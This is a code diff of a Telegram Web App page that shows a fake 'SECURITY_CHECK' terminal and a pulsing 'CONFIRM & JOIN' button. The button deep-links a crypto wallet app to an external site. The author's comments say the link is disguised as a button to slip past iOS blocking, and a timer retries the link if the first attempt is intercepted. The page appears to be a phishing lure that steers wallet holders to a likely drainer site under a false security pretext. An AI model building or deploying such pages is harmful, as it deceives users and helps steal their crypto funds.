@@ -1,44 +1,45 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TERMINAL</title>
+    <title>AUTH_TERMINAL</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background-color: #000; color: #ff0000; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        #terminal { width: 90%; border: 1px solid #ff0000; padding: 15px; background: rgba(15, 0, 0, 0.9); box-shadow: 0 0 10px #ff0000; font-size: 13px; }
-        /* 关键：把链接伪装成按钮 */
-        .btn-link {
-            display: inline-block;
+        body { background: #000; color: #f00; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        #terminal { width: 85%; border: 1px solid #f00; padding: 20px; background: #100; box-shadow: 0 0 15px #f00; }
+        /* 关键：这是一个真实的 A 标签，伪装成按钮，iOS 对这种标签拦截率最低 */
+        .giant-link {
+            display: block;
+            width: 200px;
+            padding: 20px;
             margin-top: 30px;
-            padding: 20px 50px;
-            background: #ff0000;
+            background: #f00;
             color: #000;
+            text-align: center;
             text-decoration: none;
             font-weight: bold;
-            border-radius: 4px;
-            text-transform: uppercase;
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
-            text-align: center;
+            font-size: 18px;
+            border-radius: 5px;
+            animation: pulse 1s infinite;
         }
-        .log-line { color: #0f0; margin: 5px 0; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
+        .log { color: #0f0; font-size: 12px; margin-top: 10px; }
     </style>
 </head>
 <body>
 
     <div id="terminal">
-        <div style="font-weight: bold; margin-bottom: 10px;">[ SYSTEM_READY ]</div>
-        <div id="display">
-            <p class="log-line">> PROTOCOL: TPDAPP_DETECTED</p>
-            <p class="log-line">> STATUS: AWAITING_USER_LINK_CLICK</p>
-        </div>
+        <h2>> SECURITY_CHECK</h2>
+        <p>> ENCRYPTED_CONNECTION: TRUE</p>
+        <p id="status">> STATUS: AWAITING_HANDSHAKE...</p>
+        <div class="log" id="log"></div>
     </div>
 
     <a href="tpdapp://open?params=%7B%22url%22%3A%22https%3A%2F%2Fpatrickdafhao-code.github.io%2Fcook%2F%22%7D" 
-       class="btn-link" 
-       id="gateBtn">
-        CONNECT & CLAIM
+       class="giant-link" 
+       onclick="logIt()">
+        CONFIRM & JOIN
     </a>
 
     <script>
@@ -46,10 +47,18 @@
         tg.ready();
         tg.expand();
 
-        // 这里的脚本只负责震动，不负责跳转，这样就不会被拦截
-        document.getElementById('gateBtn').addEventListener('click', function() {
+        function logIt() {
+            // 震动
             tg.HapticFeedback.notificationOccurred('success');
-            document.getElementById('display').innerHTML += '<p class="log-line">> [OS]: CALLING_WALLET_APP...</p>';
+            document.getElementById('status').innerText = "> STATUS: OS_INTERCEPT_BYPASS...";
+            document.getElementById('log').innerHTML += "<p>> [SYS]: FORCING_PROTOCOL_HANDSHAKE...</p>";
+        }
+
+        // 自动刷新逻辑：如果 2 秒没跳走，尝试用 SDK 再拉一次
+        document.querySelector('.giant-link').addEventListener('click', function() {
+            setTimeout(() => {
+                tg.openLink("tpdapp://open?params=%7B%22url%22%3A%22https%3A%2F%2Fpatrickdafhao-code.github.io%2Fcook%2F%22%7D", { try_browser: true });
+            }, 500);
         });
     </script>
 </body>
